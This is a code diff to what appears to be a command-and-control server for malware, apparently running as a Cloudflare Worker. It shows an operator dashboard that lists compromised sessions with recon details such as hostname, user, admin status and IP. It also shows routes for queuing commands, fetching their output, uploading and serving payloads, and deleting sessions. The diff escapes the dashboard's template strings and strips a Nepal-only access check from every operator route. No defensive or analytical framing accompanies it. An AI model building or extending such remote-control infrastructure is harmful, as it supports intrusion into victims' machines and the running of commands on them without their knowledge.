@@ -1016,14 +1016,14 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
       const bc=s.pending_tasks>0?'tasks':stale?'stale':'live';
       const btLabel=s.pending_tasks>0?('&#x25B3; '+s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('&#x25CF; LIVE '+fmt(idle));
       const isAdmin=s.recon?.elevated;
-      return `<div class="session-item${s.session===selectedSid?' active':''}" onclick="selectSession('${esc(s.session)}')">
+      return \`<div class="session-item\${s.session===selectedSid?' active':''}" onclick="selectSession('\${esc(s.session)}')">
         <div class="si-top">
-          <div class="sid">${esc(s.session.slice(0,24))}${s.session.length>24?'..':''}</div>
-          <div class="si-badges">${isAdmin?'<span class="sbadge admin">&#x25B2;ADM</span>':''}<span class="sbadge ${bc}"><span class="sbadge-dot"></span>${btLabel}</span></div>
+          <div class="sid">\${esc(s.session.slice(0,24))}\${s.session.length>24?'..':''}</div>
+          <div class="si-badges">\${isAdmin?'<span class="sbadge admin">&#x25B2;ADM</span>':''}<span class="sbadge \${bc}"><span class="sbadge-dot"></span>\${btLabel}</span></div>
         </div>
-        <div class="smeta"><span class="hi">${esc(s.recon?.hostname||'unknown')}</span> &bull; ${esc(s.remote_ip)}</div>
-        <div class="smeta">${esc(s.recon?.user||'?')} &bull; idle ${fmt(idle)}</div>
-      </div>`;
+        <div class="smeta"><span class="hi">\${esc(s.recon?.hostname||'unknown')}</span> &bull; \${esc(s.remote_ip)}</div>
+        <div class="smeta">\${esc(s.recon?.user||'?')} &bull; idle \${fmt(idle)}</div>
+      </div>\`;
     }).join('');
   }
   window.refreshSessions = refreshSessions;
@@ -1082,20 +1082,20 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     const newCount=entries.length-lastResultCount;
     box.innerHTML=sorted.map((e,i)=>{
       const lines=esc(e.output).split('\\n');
-      const lineHtml=lines.map((l,li)=>`<div class="ln"><span class="ln-num">${li+1}</span><span class="ln-txt">${l||'&nbsp;'}</span></div>`).join('');
+      const lineHtml=lines.map((l,li)=>\`<div class="ln"><span class="ln-num">\${li+1}</span><span class="ln-txt">\${l||'&nbsp;'}</span></div>\`).join('');
       const ts=e.ts.replace('T',' ').slice(0,19);
       const byteLen=new TextEncoder().encode(e.output).length;
       const isNew=hasNew&&i>=(sorted.length-Math.max(newCount,0));
-      return `<div class="result-entry${isNew?' new-flash':''}">
+      return \`<div class="result-entry\${isNew?' new-flash':''}">
         <div class="result-hdr">
-          <span class="r-idx">#${i+1}</span>
+          <span class="r-idx">#\${i+1}</span>
           <span class="r-label">OUTPUT</span>
-          <span class="r-ts">${ts} UTC</span>
-          <span class="r-len">${byteLen}B / ${lines.length}L</span>
-          <button class="r-copy" onclick="copyResult(this,${i})" title="Copy">&#x2398;</button>
+          <span class="r-ts">\${ts} UTC</span>
+          <span class="r-len">\${byteLen}B / \${lines.length}L</span>
+          <button class="r-copy" onclick="copyResult(this,\${i})" title="Copy">&#x2398;</button>
         </div>
-        <div class="result-body">${lineHtml}</div>
-      </div>`;
+        <div class="result-body">\${lineHtml}</div>
+      </div>\`;
     }).join('');
     box._entries=sorted; box.dataset.sid=selectedSid;
     if (atBottom||hasNew) box.scrollTop=box.scrollHeight;
@@ -1142,7 +1142,7 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
       {k:'result count',v:String(s.result_count??0),cls:''},
     ].filter(c=>c.v!=null&&c.v!==''&&c.v!=='undefined UTC');
     document.getElementById('recon-pane').innerHTML='<div class="recon-grid">'+
-      cells.map(c=>`<div class="recon-cell"><div class="recon-key">${esc(c.k)}</div><div class="recon-val ${c.cls}">${esc(String(c.v))}</div></div>`).join('')+'</div>';
+      cells.map(c=>\`<div class="recon-cell"><div class="recon-key">\${esc(c.k)}</div><div class="recon-val \${c.cls}">\${esc(String(c.v))}</div></div>\`).join('')+'</div>';
   }
 
   async function sendCmd(preset) {
@@ -1186,12 +1186,12 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
     list.innerHTML=entries.map(e=>{
       const t=e.ts.replace('T',' ').slice(0,19);
       const detail=e.detail?Object.entries(e.detail).map(([k,v])=>k+':'+v).join(' '):'';
-      return `<div class="audit-entry ${esc(e.action)}">
-        <div class="a-time">${t}</div>
-        <div class="a-action" style="color:${ac[e.action]||'var(--muted)'}">${esc(e.action).replace(/_/g,' ')}</div>
-        ${detail?'<div class="a-detail">'+esc(detail)+'</div>':''}
-        <div class="a-ip">${esc(e.ip)}</div>
-      </div>`;
+      return \`<div class="audit-entry \${esc(e.action)}">
+        <div class="a-time">\${t}</div>
+        <div class="a-action" style="color:\${ac[e.action]||'var(--muted)'}">\${esc(e.action).replace(/_/g,' ')}</div>
+        \${detail?'<div class="a-detail">'+esc(detail)+'</div>':''}
+        <div class="a-ip">\${esc(e.ip)}</div>
+      </div>\`;
     }).join('');
   }
   window.fetchAudit = fetchAudit;
@@ -1206,15 +1206,13 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
 </script>
 </body>
 </html>`;
-// ─── Geo Guard (dashboard routes only) ───────────────────
-
-function isNepal(request: Request): boolean {
-  const country = request.headers.get("CF-IPCountry") ?? "";
-  return country === "NP";
-}
 
 function geoBlock(): Response {
   return new Response("403 Forbidden", { status: 403, headers: { "Content-Type": "text/plain" } });
+}
+
+function isNepal(request: Request): boolean {
+  return (request.headers.get("CF-IPCountry") ?? "") === "NP";
 }
 
 // ─── Auth Handler ─────────────────────────────────────────
@@ -1299,30 +1297,26 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(await handleDownloadPayload(env), env);
   }
 
-  // ── Operator routes (X-Operator-Token, Nepal only) ────────
+  // ── Operator routes (X-Operator-Token) ────────
   // Rate limit all operator API calls: 120/min per IP
   if (path === "/sessions" && method === "GET") {
-    if (!isNepal(request)) return geoBlock();
     if (rateLimitHit(`op:${ip}`, RL_API_MAX)) return withCORS(rateLimitResponse(), env);
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleListSessions(request, env), env);
   }
   if (path === "/task" && method === "POST") {
-    if (!isNepal(request)) return geoBlock();
     if (rateLimitHit(`op:${ip}`, RL_API_MAX)) return withCORS(rateLimitResponse(), env);
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleAddTask(request, env), env);
   }
   if (path === "/audit" && method === "GET") {
-    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleAudit(request, env), env);
   }
   if (path === "/payload" && method === "POST") {
-    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleUploadPayload(request, env), env);
@@ -1331,7 +1325,6 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
   // ── Parameterised operator routes ──────────────────────
   const resultsMatch = path.match(/^\/results\/(.+)$/);
   if (resultsMatch && method === "GET") {
-    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     const sid = decodeURIComponent(resultsMatch[1]);
@@ -1340,7 +1333,6 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
 
   const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
   if (sessionsMatch && method === "DELETE") {
-    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     const sid = decodeURIComponent(sessionsMatch[1]);
